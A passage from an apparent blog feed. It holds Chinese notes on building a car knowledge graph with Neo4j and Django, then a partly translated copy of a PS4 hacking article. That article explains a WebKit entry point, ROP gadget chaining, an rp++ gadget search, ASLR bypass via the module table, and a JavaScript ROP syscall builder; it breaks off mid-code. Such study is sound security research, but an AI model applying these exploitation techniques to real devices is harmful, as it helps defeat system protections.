      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>知识图谱完整项目实战-笔记</title>
    <url>/2019/08/08/%E7%9F%A5%E8%AF%86%E5%9B%BE%E8%B0%B1%E5%AE%8C%E6%95%B4%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><a href="https://study.163.com/course/introduction/1006292001.htm?share=1&amp;shareId=2297883">网易云课堂地址</a></p>
<span id="more"></span>
<h1 id="基础理论篇"><a href="#基础理论篇" class="headerlink" title="基础理论篇"></a>基础理论篇</h1><h2 id="完整项目案例运行演示"><a href="#完整项目案例运行演示" class="headerlink" title="完整项目案例运行演示"></a>完整项目案例运行演示</h2><p>案例驱动：汽车领域知识图谱</p>
<p>实战开发：知识抽取、建模、推理、存储、应用</p>
<p>源码剖析</p>
<p>案例效果：</p>
<ul>
<li>实体识别（通用和领域）、中文分词、词性标注</li>
<li>实体查询（关系图）</li>
<li>关系查询（关系图）</li>
</ul>
<h2 id="项目开发环境安装部署"><a href="#项目开发环境安装部署" class="headerlink" title="项目开发环境安装部署"></a>项目开发环境安装部署</h2><p><img src="/img/kg-notes/env.png" alt="开发环境"></p>
<ul>
<li>建议Djnago和Neo4j运行在同一服务器上</li>
</ul>
<h2 id="项目业务需求分析"><a href="#项目业务需求分析" class="headerlink" title="项目业务需求分析"></a>项目业务需求分析</h2><ul>
<li>基于搜索引擎的商业数据分析</li>
</ul>
<h2 id="项目总体架构设计"><a href="#项目总体架构设计" class="headerlink" title="项目总体架构设计"></a>项目总体架构设计</h2><p><img src="/img/kg-notes/structure.png" alt="汽车知识图谱系统架构"></p>
<p>ETL(Extract-Transform-Load, 数据仓库技术)：将数据从来源端经过提取（extract）、转换（transform）、加载（load）至目的端</p>
<p>数据源：结构化数据 &gt; <em>半结构化数据</em> &gt; 非结构化数据</p>
<p>网络爬虫：Scrapy</p>
<h1 id="模型设计篇"><a href="#模型设计篇" class="headerlink" title="模型设计篇"></a>模型设计篇</h1><h2 id="知识图谱模型设计"><a href="#知识图谱模型设计" class="headerlink" title="知识图谱模型设计"></a>知识图谱模型设计</h2><ul>
<li>参照法：UMLS（一体化医学语言系统），TCMLS（中医药学语言系统）</li>
<li>归纳法：产品生命周期，业务流程拆解</li>
</ul>
<p><img src="/img/kg-notes/kg_design_flow.png" alt="知识图谱模型设计流程"></p>
<h2 id="知识图谱语义类型设计"><a href="#知识图谱语义类型设计" class="headerlink" title="知识图谱语义类型设计"></a>知识图谱语义类型设计</h2><ul>
<li>高层抽象可复用（参照与对标）<ul>
<li>现象或过程：被动</li>
<li>活动：主动</li>
</ul>
</li>
<li>底层明细需适配（归纳法）</li>
</ul>
<h2 id="知识图谱语义关系设计"><a href="#知识图谱语义关系设计" class="headerlink" title="知识图谱语义关系设计"></a>知识图谱语义关系设计</h2><p>方法同上</p>
<h1 id="知识获取篇"><a href="#知识获取篇" class="headerlink" title="知识获取篇"></a>知识获取篇</h1><ul>
<li>网络爬虫：动态页面，爬虫与反爬虫</li>
<li>数据导入：Neo4j</li>
<li>数据资产</li>
</ul>
<h2 id="开发环境安装部署"><a href="#开发环境安装部署" class="headerlink" title="开发环境安装部署"></a>开发环境安装部署</h2><ul>
<li>PyCharm<ul>
<li>requests-html</li>
</ul>
</li>
</ul>
<h2 id="汽车品牌数据获取"><a href="#汽车品牌数据获取" class="headerlink" title="汽车品牌数据获取"></a>汽车品牌数据获取</h2><ul>
<li>页面元素分析<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">url</span> = <span class="string">&#x27;https://car.autohome.com.cn/&#x27;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="汽车车系数据获取"><a href="#汽车车系数据获取" class="headerlink" title="汽车车系数据获取"></a>汽车车系数据获取</h2><h2 id="汽车数据批量导入"><a href="#汽车数据批量导入" class="headerlink" title="汽车数据批量导入"></a>汽车数据批量导入</h2><h3 id="品牌数据导入"><a href="#品牌数据导入" class="headerlink" title="品牌数据导入"></a>品牌数据导入</h3><ul>
<li>将<code>.csv</code>放入<code>/var/lib/neo4j/import</code></li>
<li><code>LOAD CSV WITH HEADERS FROM &quot;file:///bank.csv&quot; AS line CREATE (:Bank &#123;name:line.bank, count:line.count&#125;)</code></li>
</ul>
<h3 id="车系数据导入"><a href="#车系数据导入" class="headerlink" title="车系数据导入"></a>车系数据导入</h3><ul>
<li>将<code>.csv</code>放入<code>/var/lib/neo4j/import</code></li>
<li><code>LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line CREATE (:Series &#123;name:line.series, count:line.count&#125;)</code></li>
</ul>
<h3 id="关系数据导入"><a href="#关系数据导入" class="headerlink" title="关系数据导入"></a>关系数据导入</h3><ul>
<li><code>LOAD CSV WITH HEADERS FROM &quot;file:///series.csv&quot; AS line MATCH (a:Bank&#123;name:line.bank&#125;), (b:Series &#123;name:line.series&#125;) CREATE (a)-[:Subtype]-&gt;(b)</code></li>
</ul>
<h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><ul>
<li><code>CREATE CONSTRAINT ON (b:Bank) ASSERT b.name IS UNIQUE</code></li>
</ul>
<h2 id="汽车车型数据获取"><a href="#汽车车型数据获取" class="headerlink" title="汽车车型数据获取"></a>汽车车型数据获取</h2><h2 id="汽车配置数据获取"><a href="#汽车配置数据获取" class="headerlink" title="汽车配置数据获取"></a>汽车配置数据获取</h2><h1 id="程序设计篇"><a href="#程序设计篇" class="headerlink" title="程序设计篇"></a>程序设计篇</h1><ul>
<li>Web前端框架：django</li>
<li>实体关系查询，命名实体查询</li>
<li>图数据可视化：Echarts</li>
</ul>
<h2 id="web前端框架设计"><a href="#web前端框架设计" class="headerlink" title="web前端框架设计"></a>web前端框架设计</h2><p><img src="/img/kg-notes/django_flow.png" alt="django交互流程"><br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">urls.<span class="keyword">py</span> -&gt; *<span class="keyword">view</span>.<span class="keyword">py</span> -&gt; templates</span><br><span class="line"></span><br><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> runserver <span class="number">0</span>:<span class="number">8000</span></span><br></pre></td></tr></table></figure></p>
<h2 id="通用领域命名实体识别"><a href="#通用领域命名实体识别" class="headerlink" title="通用领域命名实体识别"></a>通用领域命名实体识别</h2><ul>
<li>三大类：实体类、时间类、数字类</li>
<li>七小类：人名、机构名、地名、时间、日期、货币、百分比</li>
</ul>
<p><img src="/img/kg-notes/general_ner_methods.png" alt="通用命名实体识别方法"></p>
<h3 id="基于词典的方法"><a href="#基于词典的方法" class="headerlink" title="基于词典的方法"></a>基于词典的方法</h3><ul>
<li>词性标注</li>
<li><a href="http://thulac.thunlp.org/">THULAC</a>：一个高效的中文词法分析工具包<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">n<span class="regexp">/名词 np/</span>人名 ns<span class="regexp">/地名 ni/</span>机构名 nz/其它专名</span><br><span class="line">m<span class="regexp">/数词 q/</span>量词 mq<span class="regexp">/数量词 t/</span>时间词 f<span class="regexp">/方位词 s/</span>处所词</span><br><span class="line">v<span class="regexp">/动词 a/</span>形容词 d<span class="regexp">/副词 h/</span>前接成分 k<span class="regexp">/后接成分 i/</span>习语 </span><br><span class="line">j<span class="regexp">/简称 r/</span>代词 c<span class="regexp">/连词 p/</span>介词 u<span class="regexp">/助词 y/</span>语气助词</span><br><span class="line">e<span class="regexp">/叹词 o/</span>拟声词 g<span class="regexp">/语素 w/</span>标点 x/其它</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="开源框架CoreNLP"><a href="#开源框架CoreNLP" class="headerlink" title="开源框架CoreNLP"></a>开源框架CoreNLP</h3><ul>
<li>java</li>
<li>基于CRF</li>
<li><code>/O</code>表示非实体</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">java -mx600m -cp standford-ner-<span class="number">3.9</span>.<span class="number">1</span><span class="selector-class">.jar</span> edu<span class="selector-class">.stanford</span><span class="selector-class">.nlp</span><span class="selector-class">.ie</span><span class="selector-class">.NERClassifierCombiner</span> -ner<span class="selector-class">.model</span> classifiers/chinese<span class="selector-class">.kbp</span><span class="selector-class">.distsim</span><span class="selector-class">.crf</span><span class="selector-class">.ser</span><span class="selector-class">.gz</span> -inputEncoding gb18030 -textFile test.txt</span><br></pre></td></tr></table></figure>
<h2 id="垂直领域命名实体识别"><a href="#垂直领域命名实体识别" class="headerlink" title="垂直领域命名实体识别"></a>垂直领域命名实体识别</h2><p>汽车领域命名实体<em>词典</em>设计和应用（生产环境）</p>
<h2 id="实体查询程序设计"><a href="#实体查询程序设计" class="headerlink" title="实体查询程序设计"></a>实体查询程序设计</h2><ul>
<li>Neo4j开发驱动</li>
<li>Py2neo开发框架<ul>
<li><code>run()</code></li>
<li><code>data()</code></li>
<li><code>neo4j_models.py</code></li>
</ul>
</li>
</ul>
<h2 id="关系查询程序设计"><a href="#关系查询程序设计" class="headerlink" title="关系查询程序设计"></a>关系查询程序设计</h2><h2 id="知识图谱数据可视化"><a href="#知识图谱数据可视化" class="headerlink" title="知识图谱数据可视化"></a>知识图谱数据可视化</h2><ul>
<li>可视化方案：D3和Echarts</li>
<li>Echarts</li>
</ul>
<h1 id="知识图谱应用"><a href="#知识图谱应用" class="headerlink" title="知识图谱应用"></a>知识图谱应用</h1><h2 id="推荐系统基本原理和实现机制"><a href="#推荐系统基本原理和实现机制" class="headerlink" title="推荐系统基本原理和实现机制"></a>推荐系统基本原理和实现机制</h2><h3 id="推荐系统类型"><a href="#推荐系统类型" class="headerlink" title="推荐系统类型"></a>推荐系统类型</h3><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算法</th>
<th>优势</th>
<th>劣势</th>
<th>案例</th>
</tr>
</thead>
<tbody>
<tr>
<td>基于交易历史</td>
<td>协同过滤</td>
<td>准确性高</td>
<td>冷启动</td>
<td>商品推荐（啤酒与尿布）</td>
</tr>
<tr>
<td>基于行为轨迹</td>
<td>协同过滤</td>
<td>数据密集</td>
<td>准确性低</td>
<td>内容推荐</td>
</tr>
<tr>
<td>基于知识图谱</td>
<td>相似计算</td>
<td>冷热无关</td>
<td>知识建模</td>
<td>商品推荐</td>
</tr>
</tbody>
</table>
</div>
<h2 id="知识图谱与推荐系统融合的模式"><a href="#知识图谱与推荐系统融合的模式" class="headerlink" title="知识图谱与推荐系统融合的模式"></a>知识图谱与推荐系统融合的模式</h2><h3 id="融合方式"><a href="#融合方式" class="headerlink" title="融合方式"></a>融合方式</h3><div class="table-container">
<table>
<thead>
<tr>
<th>方式</th>
<th>算法</th>
<th>优势</th>
<th>案例</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>基于实体属性</td>
<td>实体相似</td>
<td>线索拓展</td>
<td>同一价位</td>
<td></td>
</tr>
<tr>
<td>基于实体关系</td>
<td>实体相关</td>
<td>线索拓展</td>
<td>同一品牌</td>
<td></td>
</tr>
<tr>
<td>基于特征向量</td>
<td>水波算法</td>
<td>线索拓展</td>
<td>RippleNet</td>
<td>依次训练、联合训练、交替训练</td>
</tr>
</tbody>
</table>
</div>
<p><img src="/img/kg-notes/KGE_train_methods.png" alt="知识图谱特征学习与推荐系统结合的三种方式"></p>
<h2 id="基于KGE的开源推荐系统框架"><a href="#基于KGE的开源推荐系统框架" class="headerlink" title="基于KGE的开源推荐系统框架"></a>基于KGE的开源推荐系统框架</h2><p><a href="https://github.com/hwwang55/RippleNet">RippleNet</a>基于KGE的联合训练推荐框架工作原理和实现机制</p>
<p><img src="/img/kg-notes/RippleNet-framework.jpg" alt="RippleNet框架结构"></p>
<ul>
<li>绿色条状为输出，最后形成用户向量，并与物品向量计算相似度。</li>
<li><code>Hop</code> 节点向出度方向跳跃一次，形成<code>Ripple</code>集合。</li>
<li>对于给定的用户<code>u</code>和物品<code>v</code>，我们将历史相关实体集合<code>V</code>中的所有实体进行相似度计算，并利用计算得到的权重值对<code>V</code>中实体在知识图谱中对应的尾节点进行加权求和。求和得到的结果可以视为<code>v</code>在<code>u</code>的一跳相关实体中的一个响应。该过程可以重复在<code>u</code>的二跳、三跳相关实体中进行，如此<code>v</code>在知识图谱上便以<code>V</code>为中心逐层向外扩散。</li>
<li><code>RippleNet</code>中没有对用户直接使用向量进行刻画，而是用用户点击过的物品向量集合作为其特征。</li>
</ul>
<h2 id="RippleNet开源框架源码剖析"><a href="#RippleNet开源框架源码剖析" class="headerlink" title="RippleNet开源框架源码剖析"></a>RippleNet开源框架源码剖析</h2><p><a href="https://github.com/hwwang55/RippleNet">RippleNet</a></p>
<ul>
<li>tensorflow</li>
</ul>
]]></content>
      <categories>
        <category>知识图谱</category>
      </categories>
      <tags>
        <tag>知识图谱</tag>
      </tags>
  </entry>
  <entry>
    <title>破解 PS4 - 第一部分：PS4 安全和用户态 ROP 简介</title>
    <url>/2019/05/06/%E7%A0%B4%E8%A7%A3-PS4-%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<p><em>原文标题 Hacking the PS4, part 1 Introduction to PS4’s security, and userland ROP (日期未知)</em></p>
<p>作者：<a href="https://github.com/CTurt">CTurt</a></p>
<p>由于目前很长时间没有关于 PS4 破解的重大公告，我想解释一下 PS4 破解已经走了多远，以及阻止它进一步发展的原因。</p>
<p>我将解释一些通用于所有现代系统的安全概念，以及我在 PS4 上运行 ROP 测试所做的发现。</p>
<p>本系列文章的目标是展示完整的漏洞利用链，从访问 Internet 浏览器的网页，到最终在 PS4 上实现内核代码执行。</p>
<p>如果您对漏洞挖掘不是特别熟悉，那么您应该先阅读我的关于<a href="http://cturt.github.io/DS-exploit-finding.html">通过保存文件中的栈粉碎漏洞来破解 DS 游戏</a>的文章。</p>
<p>您可以在此下载我的<a href="https://github.com/CTurt/PS4-playground">完整设置</a>以自行运行这些测试；它目前仅适用于固件 1.76。如果您正在使用较旧的固件并希望更新到 1.76，则可以下载 <a href="http://www.psdevwiki.com/ps4/1.760.000">1.76 PUP</a> 文件并<a href="https://www.playstation.com/en-us/support/system-updates/ps4/">通过 USB 更新</a>。</p>
<span id="more"></span>
<h1 id="PS4-背景"><a href="#PS4-背景" class="headerlink" title="PS4 背景"></a>PS4 背景</h1><blockquote>
<p>您可能知道 PS4 使用的是定制的 AMD x86-64 CPU（8核），即使此特定版本可能与已知标准稍有不同，目前仍有许多研究成果可用于此 CPU 架构。 例如，PFLA（Page Fault Liberation Army）在 29C3 大会期间发布了仅使用页错误和 x86 MMU 实现完整图灵机的概念证明，您可以在 YouTube 上查看他们的精彩视频。 如果您尝试在虚拟机中运行代码并希望在主机 CPU 上执行指令，也会很有趣。</p>
<p>— <cite><a href="http://www.eurasia.nu/modules.php?name=News&amp;file=article&amp;sid=3251">EurAsia 新闻 3251 号文章</a></cite></p>
</blockquote>
<p>除了表现良好的 CPU 架构外，<a href="https://en.wikipedia.org/wiki/PlayStation_4_system_software">PS4 中使用的大部分软件</a>都是<a href="http://www.scei.co.jp/ps4-license/">开源</a>的。</p>
<p>最值得注意的是，PS4 的 Orbis OS 基于 FreeBSD 9.0，就像 PS3 的操作系统一样（也有部分 NetBSD）；并包括各种许多其他开源软件，如 <a href="http://www.mono-project.com/docs/advanced/runtime/">Mono VM</a> 和 <a href="https://www.webkit.org/">WebKit</a>。</p>
<h1 id="从-WebKit-入手"><a href="#从-WebKit-入手" class="headerlink" title="从 WebKit 入手"></a>从 WebKit 入手</h1><p>WebKit 是开源的布局引擎，它被用于 iOS，Wii U，3DS，PS Vita 和 PS4 的浏览器中来呈现网页。</p>
<p>尽管 WebKit 被广泛使用，但它确实存在漏洞；通过阅读 <a href="https://en.wikipedia.org/wiki/Pwn2Own#Summary_of_successful_exploits">Pwn2Own write-ups</a>，你可以了解其中的许多内容。</p>
<p>特别是 PS4 1.76 版本固件中的浏览器使用的 WebKit 版本易受到 <a href="https://www.exploit-db.com/exploits/28081/">CVE-2012-3748</a> 的攻击，这是由 <code>JSArray :: sort(...)</code> 方法中基于堆的缓冲区溢出造成的。</p>
<p>2014年，NAS 和 Proxima <a href="http://wololo.net/talk/viewtopic.php?p=368577">宣布</a>他们已经成功地将一个利用该漏洞破解 Mac OS X Safari 代码移植到 PS4 的浏览器，并公布了作为破解 PS4 第一个入口点的 PoC 代码。</p>
<p>这使我们可以任意读写 WebKit 进程可以读取和写入的内容，这些内容可以用于转储模块，并覆盖栈上的返回地址，让我们控制指令指针寄存器（<code>rip</code>）来实现 RO P执行。</p>
<p>从那时起，WebKit 中<a href="http://webkitgtk.org/security/WSA-2016-0003.html">发现</a>了许多<a href="http://webkitgtk.org/security/WSA-2016-0002.html">其他漏洞</a>，这些漏洞可能被用作 PS4 后期固件的入口点，但截至撰写时，没有人公开宣称将任何这些漏洞利用代码移植到 PS4。</p>
<p>如果您从未登录 PSN，您的 PS4 将无法打开 Internet 浏览器，但您可以转到“设置”，然后选择“用户指南”打开功能有限的 Web 浏览器视图，您可以用代理控制其中的内容。</p>
<h1 id="ROP-是什么？"><a href="#ROP-是什么？" class="headerlink" title="ROP 是什么？"></a>ROP 是什么？</h1><p>与 DS 等早期设备不同，PS4 有一个内核来控制内存不同区域的属性。其中标记为可执行的内存页面不能被覆写，并且标记为可写的内存页面不能被执行; 这称为<a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">数据执行保护（DEP）</a>。</p>
<p>这意味着我们不能只将有效负载复制到内存中并执行。但是，我们可以执行已加载到内存中并标记为可执行的代码。</p>
<p>如果我们不能将自己的代码编写到某个地址地址，那么跳转到该地址并不是非常有用，因此我们使用 ROP。</p>
<p><a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP（Return-Oriented Programming）</a>是传统栈粉碎技术的扩展，我们可以将许多不同的地址（称为 gadgets）链接在一起，而不是仅覆盖 <code>rip</code> 将跳转到的单个值。</p>
<p>一条 gadget 通常只是一个所需的指令以及一个 <code>ret</code>。</p>
<p>在 x86_64 程序集中，当到达 <code>ret</code> 指令时，程序会从栈中弹出一个 64 位的值并且将 <code>rip</code> 跳转到它；由于我们可以控制堆栈，所以我们可以使每个 <code>ret</code> 指令跳转到下一个所需的 gadget。</p>
<p>例如 <code>0x80000</code> 处：</p>
<pre><code>mov rax, 0
ret
</code></pre><p><code>0x90000</code> 处：</p>
<pre><code>mov rbx, 0
ret
</code></pre><p>If we overwrite a return address on the stack to contain <code>0x80000</code> followed by <code>0x90000</code>, then as soon as the first <code>ret</code> instruction is reached execution will jump to <code>mov rax, 0</code>, and immediately afterwards, the next <code>ret</code> instruction will pop <code>0x90000</code> off the stack and jump to <code>mov rbx, 0</code>.</p>
<p>Effectively this chain will set both <code>rax</code> and <code>rbx</code> to 0, just as if we had written the code into a single location and executed it from there.</p>
<p>ROP chains aren’t just limited to a list of addresses though; assuming that from <code>0xa0000</code> contains these instructions:</p>
<pre><code>pop rax
ret
</code></pre><p>We can set the first item in the chain to <code>0xa0000</code> and the next item to any desired value for <code>rax</code>.</p>
<p>Gadgets also don’t have to end in a <code>ret</code> instruction; we can use gadgets ending in a <code>jmp</code>:</p>
<pre><code>add rax, 8
jmp rcx
</code></pre><p>By making <code>rcx</code> point to a <code>ret</code> instruction, the chain will continue as normal:</p>
<pre><code>chain.add(&quot;pop rcx&quot;, &quot;ret&quot;);
chain.add(&quot;add rax, 8; jmp rcx&quot;);
</code></pre><p>Sometimes you won’t be able to find the exact gadget that you need on its own, but with other instructions after it. For example, if you want to set <code>r8</code> to something, but only have this gadget, you will have to set <code>r9</code> to some dummy value:</p>
<pre><code>pop r8
pop r9
ret
</code></pre><p>Although you may have to be creative with how you write ROP chains, it is generally accepted that within a sufficiently large enough code dump, there will be enough gadgets for <a href="https://en.wikipedia.org/wiki/Turing_completeness">Turing-complete</a> functionality; this makes ROP a viable method of defeating DEP.</p>
<h1 id="寻找-gadgets"><a href="#寻找-gadgets" class="headerlink" title="寻找 gadgets"></a>寻找 gadgets</h1><p>Think of ROP as writing a new chapter to a book, using only words that have appeared at the end of sentences in the previous chapters.</p>
<p>It’s obvious from the structure of most sentences that we probably won’t be able to find words like ‘and’ or ‘but’ appearing at the end of any sentences, but we will need these connectives in order to write anything meaningful.</p>
<p>It is quite possible however, that a sentence has ended with ‘sand’. Although the author only ever intended for the word to be read from the ‘s’, if we start reading from the ‘a’, it will appear as an entirely different word by coincidence, ‘and’.</p>
<p>These principles also apply to ROP.</p>
<p>Since almost all functions are structured with a prologue and epilogue:</p>
<pre><code>; Save registers
push    rbp
mov     rbp, rsp
push    r15
push    r14
push    r13
push    r12
push    rbx
sub     rsp, 18h

; Function body

; Restore registers
add     rsp, 18h
pop     rbx
pop     r12
pop     r13
pop     r14
pop     r15
pop     rbp
ret
</code></pre><p>You’d expect to only be able to find <code>pop</code> gadgets, or more rarely, something like <code>xor rax, rax</code> to set the return value to 0 before returning.</p>
<p>Having a comparison like:</p>
<pre><code>cmp [rax], r12
ret
</code></pre><p>Wouldn’t make any sense since the result of the comparison isn’t used by the function. However, there is still a possibility that we can find gadgets like these.</p>
<p>x86_64 instructions are similar to words in that they have variable lengths, and can mean something entirely different depending on where decoding starts.</p>
<blockquote>
<p>The x86_64 architecture is a variable-length CISC instruction set. Return-oriented programming on the x86_64 takes advantage of the fact that the instruction set is very “dense”, that is, any random sequence of bytes is likely to be interpretable as some valid set of x86_64 instructions.</p>
<p>— <cite><a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Wikipedia</a></cite></p>
</blockquote>
<p> To demonstrate this, take a look at the end of this function from the WebKit module:</p>
<pre><code>000000000052BE0D                 mov     eax, [rdx+8]
000000000052BE10                 mov     [rsi+10h], eax
000000000052BE13                 or      byte ptr [rsi+39h], 20h
000000000052BE17                 ret
</code></pre><p>Now take a look at what the code looks like if we start decoding from <code>0x52be14</code>:</p>
<pre><code>000000000052BE14                 cmp     [rax], r12
000000000052BE17                 ret
</code></pre><p>Even though this code was never intended to be executed, it is within an area of memory which has been marked as executable, so it is perfectly valid to use as a gadget.</p>
<p>Of course, it would be incredibily time consuming to look at every possible way of interpreting code before every single <code>ret</code> instruction manually; and that’s why tools exist to do this for you. The one which I use to search for ROP gadgets is <a href="https://github.com/0vercl0k/rp/">rp++</a>; to generate a text file filled with gadgets, just use:</p>
<pre><code>rp-win-x64 -f mod14.bin --raw=x64 --rop=1 --unique &gt; mod14.txt
</code></pre><h1 id="General-protection-faults"><a href="#General-protection-faults" class="headerlink" title="General protection faults"></a>General protection faults</h1><p>If we <em>do</em> perform an access violation, such as by trying to execute a non-executable page of memory, or by trying to write to a non-writable page of memory, a general protection fault, or more specifically in this instance, a <a href="https://en.wikipedia.org/wiki/Segmentation_fault">segmentation fault</a>, will occur.</p>
<p>For example, trying to execute code on the stack, which is mapped as read and write only:</p>
<pre><code>setU8to(chain.data + 0, 0xeb);
setU8to(chain.data + 1, 0xfe);

chain.add(chain.data);
</code></pre><p>And trying to write to code, which is mapped as read and execute only:</p>
<pre><code>setU8to(moduleBases[webkit], 0);
</code></pre><p>If a general protection fault occurs, a message saying “There is not enough free system memory” will appear, and the page will fail to load:</p>
<p><img src="/img/hacking-ps4-1/segfault.png" alt=""></p>
<p>This message will also be displayed for other hard faults, such as division by 0, or execution of an invalid instruction or unimplemented system call, but most commonly it will be encountered by performing a segmentation fault.</p>
<h1 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h1><p><a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization">Address Space Layout Randomization (ASLR)</a> is a security technique which causes the base addresses of modules to be different every time you start the PS4.</p>
<p>It has been reported to me that <a href="https://www.youtube.com/watch?v=aEu208625XA">very old firmwares (1.05) don’t have ASLR enabled</a>, but it was introduced sometime before firmware 1.70. Note that kernel ASLR is not enabled (for firmwares 1.76 and lower at least), which will be proved later in the article.</p>
<p>For most exploits ASLR would be a problem because if you don’t know the addresses of the gadgets in memory, you would have no idea what to write to the stack.</p>
<p>Luckily for us, we aren’t limited to just writing static ROP chains. We can use JavaScript to read the modules table, which will tell us the base addresses of all loaded modules. Using these bases, we can then calculate the addresses of all our gadgets before we trigger ROP execution, defeating ASLR.</p>
<p>The modules table also includes the filenames of the modules:</p>
<ul>
<li>WebProcess.self</li>
<li>libkernel.sprx</li>
<li>libSceLibcInternal.sprx</li>
<li>libSceSysmodule.sprx</li>
<li>libSceNet.sprx</li>
<li>libSceNetCtl.sprx</li>
<li>libSceIpmi.sprx</li>
<li>libSceMbus.sprx</li>
<li>libSceRegMgr.sprx</li>
<li>libSceRtc.sprx</li>
<li>libScePad.sprx</li>
<li>libSceVideoOut.sprx</li>
<li>libScePigletv2VSH.sprx</li>
<li>libSceOrbisCompat.sprx</li>
<li>libSceWebKit2.sprx</li>
<li>libSceSysCore.sprx</li>
<li>libSceSsl.sprx</li>
<li>libSceVideoCoreServerInterface.sprx</li>
<li>libSceSystemService.sprx</li>
<li>libSceCompositeExt.sprx</li>
</ul>
<p>Although the PS4 predominantly uses the [<strong>S</strong>igned] <strong>P</strong>PU <strong>R</strong>elocatable E<strong>x</strong>ecutable ([S]PRX) format for modules, some string references to [<strong>S</strong>igned] <strong>E</strong>xecutable and <strong>L</strong>inking <strong>F</strong>ormat ([S]ELF) object files can also be found in the <code>libSceSysmodule.sprx</code> dump, such as <code>bdj.elf</code>, <code>web_core.elf</code> and <code>orbis-jsc-compiler.self</code>. This combination of modules and objects is similar to what is used in the PSP and PS3.</p>
<p>You can view <a href="http://www.psdevwiki.com/ps4/Libraries">a complete list of all modules available</a> (not just those loaded by the browser) in <code>libSceSysmodule.sprx</code>. We can load and dump some of these through several of Sony’s custom system calls, which will be explained later in this article.</p>
<h1 id="JuSt-ROP"><a href="#JuSt-ROP" class="headerlink" title="JuSt-ROP"></a>JuSt-ROP</h1><p>Using JavaScript to write and execute dynamic ROP chains gives us a tremendous advantage over a traditional, static buffer overflow attack.</p>
<p>As well as being necessary to defeat ASLR, JavaScript also lets us read the user agent of the browser, and provide different ROP chains for different browser versions, giving our exploit a greater range of compatibility.</p>
<p>We can even use JavaScript to read the memory at our gadgets’ addresses to check that they are correct, giving us almost perfect reliability. Theoretically, you could take this even further by writing a script to dynamically find ROP gadgets and then build ROP chains on the fly.</p>
<p>Writing ROP chains dynamically, rather than generating them with a script beforehand, just makes sense.</p>
<p>I created a JavaScript framework for writing ROP chains, <a href="https://github.com/CTurt/JuSt-ROP">JuSt-ROP</a>, for this very reason.</p>
<h1 id="JavaScript-caveats"><a href="#JavaScript-caveats" class="headerlink" title="JavaScript caveats"></a>JavaScript caveats</h1><p>JavaScript represents numbers using the <a href="https://en.wikipedia.org/wiki/IEEE_floating_point">IEEE-754</a> double-precision (64 bit) format. This provides us with 53 bit precision, meaning that it isn’t possible to represent every 64 bit value, approximations will have to be used for some.</p>
<p>If you just need to set a 64 bit value to something low, like <code>256</code>, then <code>setU64to</code> will be fine.</p>
<p>But for situations in which you need to write a buffer or struct of data, there is the possibility that certain bytes will be written incorrectly if it has been written in 64 bit chunks.</p>
<p>Instead, you should write data in 32 bit chunks (remembering that the PS4 is little endian), to ensure that every byte is exact.</p>
<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><p>Interestingly, the PS4 uses the same <a href="https://www.freebsd.org/doc/en/books/developers-handbook/x86-system-calls.html#x86-alternate-calling-convention">calling convention as Linux and MS-DOS for system calls</a>, with arguments stored in registers, rather than the traditional UNIX way (which FreeBSD uses by default), with arguments stored in the stack:</p>
<ul>
<li><code>rax</code> - System call number</li>
<li><code>rdi</code> - Argument 1</li>
<li><code>rsi</code> - Argument 2</li>
<li><code>rdx</code> - Argument 3</li>
<li><code>r10</code> - Argument 4</li>
<li><code>r8</code> - Argument 5</li>
<li><code>r9</code> - Argument 6</li>
</ul>
<p>We can try to perform any system call with the following JuSt-ROP method:</p>
<pre><code>this.syscall = function(name, systemCallNumber, arg1, arg2, arg3, arg4, arg5, arg6) &#123;
    console.log(&quot;syscall &quot; + name);

    this.add(&quot;pop rax&quot;, systemCallNumber);
    if(typeof(arg1) !== &quot;undefined&quot;) this.add(&quot;pop rdi&quot;, arg1);
    if(typeof(arg2) !== &quot;undefined&quot;) this.add(&quot;pop rsi&quot;, arg2);
    if(typeof(arg3) !== &quot;undefined&quot;) this.add(&quot;pop rdx&quot;, arg3);
    if(typeof(arg4) !== &quot;undefined&quot;) this.add(&quot;pop rcx&quot;, arg4);
    if(typeof(arg5) !== &quot;undefined&quot;) this.add(&quot;pop r8&quot;, arg5);
    if(typeof(arg6) !== &quot;undefined&quot;) this.add(&quot;pop r9&quot;, arg6);
    this.add(&quot;mov r10, rcx; syscall&quot;);
&#125;
</code></pre><p>Just make sure to set the stack base to some free memory beforehand:</p>
<pre><code>this.add(&quot;pop rbp&quot;, stackBase + returnAddress + 0x1400);
</code></pre><p>Using system calls can tell us a huge amount about the PS4 kernel. Not only that, but using system calls is most likely the only way that we can interact with the kernel, and thus potentially trigger a kernel exploit.</p>
<p>If you are reverse engineering modules to identify some of Sony’s custom system calls, you may come across an alternative calling convention:</p>
<p>Sometimes Sony performs system calls through regular system call 0 (which usually does nothing in FreeBSD), with the first argument (<code>rdi</code>) controlling which system call should be executed:</p>
<ul>
<li><code>rax</code> - 0</li>
<li><code>rdi</code> - System call number</li>
<li><code>rsi</code> - Argument 1</li>
<li><code>rdx</code> - Argument 2</li>
<li><code>r10</code> - Argument 3</li>
<li><code>r8</code> - Argument 4</li>
<li><code>r9</code> - Argument 5</li>
</ul>
<p>It is likely that Sony did this to have easy compatibility with the function calling convention. For example:</p>
<pre><code>.global syscall
syscall:
    xor     rax, rax
